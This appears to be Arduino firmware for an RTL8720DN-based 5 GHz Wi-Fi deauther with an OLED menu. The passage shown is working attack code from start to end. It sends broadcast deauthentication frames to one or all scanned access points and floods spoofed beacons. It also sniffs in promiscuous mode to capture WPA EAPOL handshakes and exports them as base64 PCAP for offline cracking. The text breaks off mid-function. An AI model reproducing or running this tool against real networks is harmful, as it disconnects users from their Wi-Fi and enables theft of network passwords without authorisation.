// Oled code made by warwick320 // updated by Cypher --> github.com/dkyazzentwatwa/cypher-5G-deauther
// Updated again by Nickguitar --> github.com/Nickguitar/cypher-5G-deauther

// Global flag to indicate that the sniff callback has been triggered.
volatile bool sniffCallbackTriggered = false;

// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "wifi_constants.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13


#define TOTAL_MENU_ITEMS 5
const char* mainMenuItems[TOTAL_MENU_ITEMS] = { "Attack", "Scan", "Select", "Sniff", "Deauth+Sniff" };

// These globals control which items are visible.
int menuOffset = 0;     // Either 0 or 1 in our case.
int selectedIndex = 0;  // 0 to 2 (the visible slot index)

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;


// Define a structure for storing handshake data.
#define MAX_FRAME_SIZE 512
#define MAX_HANDSHAKE_FRAMES 4
#define MAX_MANAGEMENT_FRAMES 10

struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};

HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};

ManagementData capturedManagement;

// Function to reset both handshake and management frame data.
void resetCaptureData() {
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
}


// Credentials for you Wifi network
char *ssid = "0x7359";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  Serial.println(F("Scanning WiFi Network"));
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}


void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Single Attack...");
  display.display();
  while (true) {
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
  }
}
void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Attacking All...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}
void BecaonDeauth() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Beacon+Deauth Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      }
    }
  }
}
void Becaon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Beacon Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
      }
    }
  }
}
// Custom UI elements
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawProgressBar(int x, int y, int width, int height, int progress) {
  display.drawRect(x, y, width, height, WHITE);
  display.fillRect(x + 2, y + 2, (width - 4) * progress / 100, height - 4, WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawStatusBar(const char *status) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(status);
  display.setTextColor(WHITE);
}

void drawMainMenu() {
  display.clearDisplay();
  drawStatusBar("MAIN MENU");
  drawFrame();

  // Display three items starting at menuOffset.
  for (int i = 0; i < 4; i++) {
    int itemIndex = i + menuOffset;
    drawMenuItem(20 + (i * 15), mainMenuItems[itemIndex], (i == selectedIndex));
  }

  // Draw scroll arrows on the right side.
  int arrowX = SCREEN_WIDTH - 12;

  // For the up arrow: if menuOffset > 0, there are items above.
  if (menuOffset > 0) {
    // If the first row (i.e. visible row index 0) is selected, draw arrow in BLACK.
    uint16_t upArrowColor = (selectedIndex == 0) ? BLACK : WHITE;
    display.fillTriangle(arrowX, 25, arrowX + 4, 20, arrowX + 8, 25, upArrowColor);
  }

  // For the down arrow: if there are items below.
  if (menuOffset < TOTAL_MENU_ITEMS - 3) {
    // If the bottom row (i.e. visible row index 2) is selected, use BLACK.
    uint16_t downArrowColor = (selectedIndex == 2) ? BLACK : WHITE;
    display.fillTriangle(arrowX, 55, arrowX + 4, 60, arrowX + 8, 55, downArrowColor);
  }

  display.display();
}



void drawScanScreen() {
  display.clearDisplay();
  drawFrame();
  drawStatusBar("SCANNING");

  // Animated scanning effect
  static const char *frames[] = { "/", "-", "\\", "|" };
  for (int i = 0; i < 20; i++) {
    display.setCursor(48, 30);
    display.setTextSize(1);
    display.print("Scanning ");
    display.print(frames[i % 4]);
    drawProgressBar(20, 45, SCREEN_WIDTH - 40, 8, i * 5);
    display.display();
    delay(250);
  }
}

void drawNetworkList(const String &selectedSSID, const String &channelType, int scrollIndex) {
  display.clearDisplay();
  drawFrame();
  drawStatusBar("NETWORKS");

  // Network info box
  display.drawRect(4, 20, SCREEN_WIDTH - 8, 30, WHITE);
  display.setCursor(8, 24);
  display.print("SSID: ");

  // Truncate SSID if too long
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 13) {
    displaySSID = displaySSID.substring(0, 10) + "...";
  }
  display.print(displaySSID);

  // Channel type indicator
  display.drawRect(8, 35, 30, 12, WHITE);
  display.setCursor(10, 37);
  display.print(channelType);

  // Scroll indicators
  if (scrollIndex > 0) {
    display.fillTriangle(SCREEN_WIDTH - 12, 25, SCREEN_WIDTH - 8, 20, SCREEN_WIDTH - 4, 25, WHITE);
  }
  if (true) {  // Replace with actual condition for more items below
    display.fillTriangle(SCREEN_WIDTH - 12, 45, SCREEN_WIDTH - 8, 50, SCREEN_WIDTH - 4, 45, WHITE);
  }

  display.display();
}

void drawAttackScreen(int attackType) {
  display.clearDisplay();
  drawFrame();

  // Warning banner
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print("ATTACK IN PROGRESS");

  display.setTextColor(WHITE);
  display.setCursor(10, 20);

  // Attack type indicator
  const char *attackTypes[] = {
    "SINGLE DEAUTH",
    "ALL DEAUTH",
    "BEACON",
    "BEACON+DEAUTH"
  };

  if (attackType >= 0 && attackType < 4) {
    display.print(attackTypes[attackType]);
  }

  // Animated attack indicator
  static const char patterns[] = { '.', 'o', 'O', 'o' };
  for (int i = 0; i < sizeof(patterns); i++) {
    display.setCursor(10, 35);
    display.print("Attack in progress ");
    display.print(patterns[i]);
    display.display();
    delay(200);
  }
}
void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextSize(2);    
  display.setTextColor(WHITE);
  display.setCursor(7, 7);
  display.print("0x7359");
  display.setCursor(94, 48);
  //display.setFont(&Org_01);
  display.setTextSize(1);
  display.print("5 GHz");
  display.setCursor(82, 55);
  display.print("deauther");
  display.drawBitmap(52, 31, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.display();
  delay(400);
}

// New function to handle attack menu and execution
void attackLoop() {
  int attackState = 0;
  bool running = true;
  // Add this: Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawFrame();
    drawStatusBar("ATTACK MODE");

    // Draw attack options
    const char *attackTypes[] = { "Single Deauth", "All Deauth", "Beacon", "Beacon+Deauth", "Back" };
    for (int i = 0; i < 5; i++) {
      drawMenuItem(15 + (i * 10), attackTypes[i], i == attackState);
    }
    display.display();

    // Handle button inputs
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (attackState == 4) {  // Back option
        running = false;
      } else {
        // Execute selected attack
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0:
            Single();
            break;
          case 1:
            All();
            break;
          case 2:
            Becaon();
            break;
          case 3:
            BecaonDeauth();
            break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState < 4) attackState++;
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState > 0) attackState--;
    }
  }
}

// New function to handle network selection
void networkSelectionLoop() {
  bool running = true;
  // Add this: Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawNetworkList(SelectedSSID, SSIDCh, scrollindex);

    // Modified button handling
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      // Wait for button release before exiting
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
      running = false;
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {  // Added -1 to prevent overflow
        scrollindex++;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindex > 0) {
        scrollindex--;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      }
    }

    display.display();
    delay(50);  // Add small delay to prevent display flickering
  }
}

void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);

  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}


void printHandshakeData() {
  Serial.println("---- Captured Handshake Data ----");
  Serial.print("Total handshake frames captured: ");
  Serial.println(capturedHandshake.frameCount);
  
  // Iterate through each stored handshake frame.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    Serial.print("Frame ");
    Serial.print(i + 1);
    Serial.print(" (");
    Serial.print(hf.length);
    Serial.println(" bytes):");
    
    // Print hex data in a formatted manner.
    for (unsigned int j = 0; j < hf.length; j++) {
      // Print a newline every 16 bytes with offset
      if (j % 16 == 0) {
        Serial.println();
        Serial.print("0x");
        Serial.print(j, HEX);
        Serial.print(": ");
      }
      // Print leading zero if needed.
      if (hf.data[j] < 16) {
        Serial.print("0");
      }
      Serial.print(hf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println("--------------------------------");
  }
  Serial.println("---- End of Handshake Data ----");
}

void printManagementData() {
  Serial.println("---- Captured Management Data ----");
  Serial.print("Total management frames captured: ");
  Serial.println(capturedManagement.frameCount);
  
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    ManagementFrame &mf = capturedManagement.frames[i];
    Serial.print("Management Frame ");
    Serial.print(i + 1);
    Serial.print(" (");
    Serial.print(mf.length);
    Serial.println(" bytes):");
    
    for (unsigned int j = 0; j < mf.length; j++) {
      if (j % 16 == 0) {
        Serial.println();
        Serial.print("0x");
        Serial.print(j, HEX);
        Serial.print(": ");
      }
      if (mf.data[j] < 16) {
        Serial.print("0");
      }
      Serial.print(mf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println("--------------------------------");
  }
  Serial.println("---- End of Management Data ----");
}





// Updated function to scan the entire packet for EAPOL EtherType (0x88 0x8E)
// and print every instance it finds.
bool isEAPOLFrame(const unsigned char *packet, unsigned int length) {
  // Define the expected LLC+EAPOL sequence.
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  
  // Iterate through the packet and look for the sequence.
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) {
      if (packet[i + j] != eapol_sequence[j]) {
        match = false;
        break;
      }
    }
    if (match) {
      Serial.print("EAPOL sequence found at offset: ");
      Serial.println(i);
      return true;
    }
  }
  return false;
}


// Helper function: extract frame type and subtype from the first two bytes.
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
  // Frame Control field is in the first two bytes (little endian)
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;      // bits 2-3
  subtype = (fc >> 4) & 0x0F;   // bits 4-7
}

// Helper function: returns the offset at which the EAPOL payload starts
// Find the offset where the LLC+EAPOL signature starts.
unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i <= length - sig_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) {
        match = false;
        break;
      }
    }
    if (match) return i;
  }
  return 0; // if not found, return 0 (compare full frame)
}

// Extract the Sequence Control field (assumes 24-byte header; bytes 22-23).
unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
  if (length < 24) return 0;
  return packet[22] | (packet[23] << 8);
}

void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  sniffCallbackTriggered = true;
  
  unsigned int type, subtype;
  get_frame_type_subtype(packet, type, subtype);
  
  // --- Capture Management Frames (Beacons/Probe Responses) ---
  if (type == 0) {  // Management
    if (subtype == 8 || subtype == 5) { // Beacon or Probe Response
      if (capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
        memcpy(mf->data, packet, mf->length);
        capturedManagement.frameCount++;
        Serial.print("Stored management frame count: ");
        Serial.println(capturedManagement.frameCount);
      }
    }
  }
  
  // --- Capture EAPOL (Handshake) Frames ---
  // Check for LLC+EAPOL signature: AA AA 03 00 00 00 88 8E
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) {
      if (packet[i + j] != eapol_sequence[j]) {
        match = false;
        break;
      }
    }
    if (match) { isEAPOL = true; break; }
  }
  
  if (isEAPOL) {
    Serial.println("EAPOL frame detected!");
    
    // Create a temporary handshake frame
    HandshakeFrame newFrame;
    newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
    memcpy(newFrame.data, packet, newFrame.length);
    
    // Extract the sequence control from the MAC header.
    unsigned short seqControl = getSequenceControl(newFrame.data, newFrame.length);
    // And find the EAPOL payload offset.
    unsigned int payloadOffset = findEAPOLPayloadOffset(newFrame.data, newFrame.length);
    unsigned int newPayloadLength = (payloadOffset < newFrame.length) ? (newFrame.length - payloadOffset) : newFrame.length;
    
    bool duplicate = false;
    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
      HandshakeFrame *stored = &capturedHandshake.frames[i];
      unsigned short storedSeq = getSequenceControl(stored->data, stored->length);
      unsigned int storedPayloadOffset = findEAPOLPayloadOffset(stored->data, stored->length);
      unsigned int storedPayloadLength = (storedPayloadOffset < stored->length) ? (stored->length - storedPayloadOffset) : stored->length;
      
      // First check: if sequence numbers differ, they are different frames.
      if (storedSeq == seqControl) {
        // Now compare the payload portion.
        if (storedPayloadLength == newPayloadLength &&
            memcmp(stored->data + storedPayloadOffset, newFrame.data + payloadOffset, newPayloadLength) == 0) {
          duplicate = true;
          Serial.print("Duplicate handshake frame (seq 0x");
          Serial.print(seqControl, HEX);
          Serial.println(") detected, ignoring.");
          break;
        }
      }
    }
    
    if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
      memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
      capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
      capturedHandshake.frameCount++;
      Serial.print("Stored handshake frame count: ");
      Serial.println(capturedHandshake.frameCount);
      if (capturedHandshake.frameCount == MAX_HANDSHAKE_FRAMES) {
        Serial.println("Complete handshake captured!");
      }
    }
  }
}








// Function to enable promiscuous (sniffing) mode using RTL8720DN's API.
void enableSniffing() {
  Serial.println("Enabling sniffing mode...");
  
  // RTW_PROMISC_ENABLE_2 is used to enable promiscuous mode,
  // rtl8720_sniff_callback is our callback function,
  // and the third parameter (1) might specify additional options (e.g., channel filtering).
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  
  Serial.println("Sniffing mode enabled. Waiting for packets...");
}

// Function to disable promiscuous mode.
void disableSniffing() {
  Serial.println("Disabling sniffing mode...");
  // Passing NULL as callback and RTW_PROMISC_DISABLE constant (if defined)
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  Serial.println("Sniffing mode disabled.");
}

// Updated startSniffing function that uses enableSniffing() and disableSniffing()
void startSniffing() {
  // Clear display and show initial message.
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
  display.setCursor(5, 25);
  display.println("Sniffing...");
  display.display();

  // Reset capture buffers.
  resetCaptureData();

  // Set the channel to that of the target AP.
  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
  Serial.print("Switched to channel: ");
  Serial.println(scan_results[scrollindex].channel);

  // Enable promiscuous mode.
  enableSniffing();
  
  // Animation frames for spinner.
  const char spinnerChars[] = { '/', '-', '\\', '|' };
  unsigned int spinnerIndex = 0;
  
  // Continue sniffing until we have 4 handshake frames and at least one management frame, or until timeout.
  unsigned long sniffStart = millis();
  const unsigned long timeout = 60000; // 60 seconds timeout
  bool cancelled = false;
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount == 0) &&
         (millis() - sniffStart) < timeout) {
      
      // Update the OLED display with the current handshake count and spinner animation.
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
      display.setCursor(5, 10);
      display.print(spinnerChars[spinnerIndex % 4]);
      SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      display.print(" Sniffing (");
      display.print(SSIDCh);
      display.print(")");
      display.setCursor(5, 25);
      display.print(SelectedSSID);
      
      
      // Draw the spinner animation on the next line.
      display.setCursor(5, 45);
      display.print("Captured EAPOL: ");
      display.print(capturedHandshake.frameCount);
      display.print("/4");
      
      display.display();
      
      spinnerIndex++; // Update spinner for next iteration.
      delay(100);

      // Allow user to cancel sniffing by pressing OK.
      if (digitalRead(BTN_OK) == LOW) {
          Serial.println("User canceled sniffing.");
          cancelled = true;
          break;
      }
  }
  
  // Disable promiscuous mode.
  disableSniffing();
  
  // Final update: show final count and a prompt to go back.
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
  display.setCursor(5, 20);
  if (cancelled) {
      display.println("Sniffing canceled!");
  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES && capturedManagement.frameCount > 0) {
      display.println("Sniffing complete!");
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, HIGH);
      digitalWrite(LED_B, LOW);
  } else {
      display.println("Sniff timeout!");
      digitalWrite(LED_R, HIGH);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
  }
  display.setCursor(5, 40);
  display.println("Press OK to return");
  display.display();
  
  // Wait for the user to press the OK button (active low)
  while (digitalRead(BTN_OK) != LOW) {
    delay(10);
  }
  delay(150);  // Debounce delay

  Serial.println("Finished sniffing.");
}


#include <vector>

// PCAP Global Header (24 bytes)
struct PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

// PCAP Packet Header (16 bytes)
struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// Simple base64 encoder function.
String base64Encode(const uint8_t *data, size_t length) {
  const char* base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  String encoded = "";
  uint32_t octet_a, octet_b, octet_c;
  uint32_t triple;
  size_t i = 0;
  
  while (i < length) {
    octet_a = i < length ? data[i++] : 0;
    octet_b = i < length ? data[i++] : 0;
    octet_c = i < length ? data[i++] : 0;
    
    triple = (octet_a << 16) + (octet_b << 8) + octet_c;
    
    encoded += base64Chars[(triple >> 18) & 0x3F];
    encoded += base64Chars[(triple >> 12) & 0x3F];
    encoded += (i - 1 < length) ? base64Chars[(triple >> 6) & 0x3F] : '=';
    encoded += (i < length) ? base64Chars[triple & 0x3F] : '=';
  }
  return encoded;
}

// Function to generate the PCAP data in a vector.
std::vector<uint8_t> generatePcapBuffer() {
  std::vector<uint8_t> pcapData;

  // Build the global header.
  PcapGlobalHeader gh;
  gh.magic_number = 0xa1b2c3d4;  // Magic number in little-endian
  gh.version_major = 2;
  gh.version_minor = 4;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = 65535;
  gh.network = 127;  // DLT_IEEE802_11_RADIO

  // Append global header bytes.
  uint8_t* ghPtr = (uint8_t*)&gh;
  for (size_t i = 0; i < sizeof(gh); i++) {
    pcapData.push_back(ghPtr[i]);
  }

  // Minimal Radiotap header (8 bytes)
  uint8_t minimal_rtap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};

  // Helper lambda to write a packet header and data.
  auto writePacket = [&](const uint8_t* packetData, size_t packetLength) {
    PcapPacketHeader ph;
    unsigned long ms = millis();
    ph.ts_sec = ms / 1000;
    ph.ts_usec = (ms % 1000) * 1000;
    // Total packet length = minimal_rtap + captured frame
    ph.incl_len = packetLength + sizeof(minimal_rtap);
    ph.orig_len = packetLength + sizeof(minimal_rtap);

    uint8_t* phPtr = (uint8_t*)&ph;
    for (size_t i = 0; i < sizeof(ph); i++) {
      pcapData.push_back(phPtr[i]);
    }
    // Append the Radiotap header.
    for (size_t i = 0; i < sizeof(minimal_rtap); i++) {
      pcapData.push_back(minimal_rtap[i]);
    }
    // Append the packet data.
    for (size_t i = 0; i < packetLength; i++) {
      pcapData.push_back(packetData[i]);
    }
  };

  // Write handshake frames.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    writePacket(hf.data, hf.length);
  }
  
  // Write management frames.
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    ManagementFrame &mf = capturedManagement.frames[i];
    writePacket(mf.data, mf.length);
  }

  return pcapData;
}

// Function to generate the PCAP file, encode it in base64, and send to Serial.
void sendPcapToSerial() {
  Serial.println("Generating PCAP file...");
  std::vector<uint8_t> pcapBuffer = generatePcapBuffer();
  Serial.print("PCAP size: ");
  Serial.print(pcapBuffer.size());
  Serial.println(" bytes");
  
  String encodedPcap = base64Encode(pcapBuffer.data(), pcapBuffer.size());
  
  Serial.println("-----BEGIN PCAP BASE64-----");
  Serial.println(encodedPcap);
  Serial.println("-----END PCAP BASE64-----");
}



void deauthAndSniff() {
  // Reset capture buffers.
  resetCaptureData();

  // Set the channel to the target AP's channel.
  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
